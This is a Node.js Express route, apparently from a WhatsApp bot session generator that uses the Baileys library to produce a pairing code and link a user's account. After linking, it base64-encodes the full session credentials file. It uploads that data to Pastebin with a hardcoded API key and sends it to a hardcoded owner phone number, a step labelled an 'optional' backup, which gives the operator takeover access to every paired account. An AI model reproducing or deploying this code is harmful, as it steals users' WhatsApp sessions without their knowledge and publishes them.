const PastebinAPI = require('pastebin-js');
const pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');

const { makeid } = require('./id');
const express = require('express');
const fs = require('fs');
const pino = require("pino");

const {
    default: France_King,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");

let router = express.Router();

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

// 👉 CHANGE THIS (optional fallback number)
const OWNER_NUMBER = "2557XXXXXXXX"; // without @s.whatsapp.net

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;

    async function FLASH_MD_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);

        try {
            let sock = France_King({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" })
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.ubuntu('Chrome') // ✅ UPDATED
            });

            // 🔑 Request pairing code
            if (!sock.authState.creds.registered) {
                await delay(2000);
                num = num.replace(/[^0-9]/g, '');

                const code = await sock.requestPairingCode(num);

                if (!res.headersSent) {
                    res.send({ code });
                }
            }

            sock.ev.on('creds.update', saveCreds);

            sock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    console.log("✅ Connected");

                    // ⏱️ IMPORTANT DELAY (fix for new WhatsApp updates)
                    await delay(15000);

                    const jid = sock.user?.id;
                    if (!jid) return;

                    // 📶 Force presence (helps notification)
                    await sock.sendPresenceUpdate('composing');
                    await delay(2000);

                    // 📂 Read session
                    let data = fs.readFileSync(`./temp/${id}/creds.json`);
                    let b64data = Buffer.from(data).toString('base64');

                    // 🌐 Upload to Pastebin (backup)
                    let pasteUrl = "Failed";
                    try {
                        pasteUrl = await pastebin.createPaste(b64data, "SESSION");
                    } catch (e) {
                        console.log("Pastebin error:", e.message);
                    }

                    // 📤 Send to self
                    let firstMsg = await sock.sendMessage(jid, {
                        text: `🔐 SESSION ID:\n\n${b64data}`
                    });

                    // 🔔 Trigger notification (second message)
                    await delay(2000);
                    await sock.sendMessage(jid, {
                        text: `✅ Session Generated Successfully\n\n🌐 Pastebin: ${pasteUrl}`
                    }, { quoted: firstMsg });

                    // 📲 Optional: send to owner (more reliable)
                    try {
                        const ownerJid = OWNER_NUMBER + "@s.whatsapp.net";
                        await sock.sendMessage(ownerJid, {
                            text: `📥 New Session:\n\n${b64data}\n\n🌐 ${pasteUrl}`
                        });
                    } catch (e) {
                        console.log("Owner send failed");
                    }

                    // 📡 ALSO RETURN SESSION IN API (VERY IMPORTANT)
                    if (!res.headersSent) {
                        res.send({
                            status: "connected",
                            session: b64data,
                            paste: pasteUrl
                        });
                    }

                    // 🧹 Cleanup
                    await delay(1000);
                    await sock.ws.close();
                    return removeFile('./temp/' + id);
                }

                // 🔄 Auto reconnect
                if (
                    connection === "close" &&
                    lastDisconnect &&
                    lastDisconnect.error &&
                    lastDisconnect.error.output?.statusCode !== 401
                ) {
                    console.log("🔄 Reconnecting...");
                    await delay(10000);
                    FLASH_MD_PAIR_CODE();
                }
            });

        } catch (err) {
            console.log("❌ Error:", err.message);

            removeFile('./temp/' + id);

            if (!res.headersSent) {
                res.send({
                    code: "Service Unavailable"
                });
            }
        }
    }

    return FLASH_MD_PAIR_CODE();
});

module.exports = router;
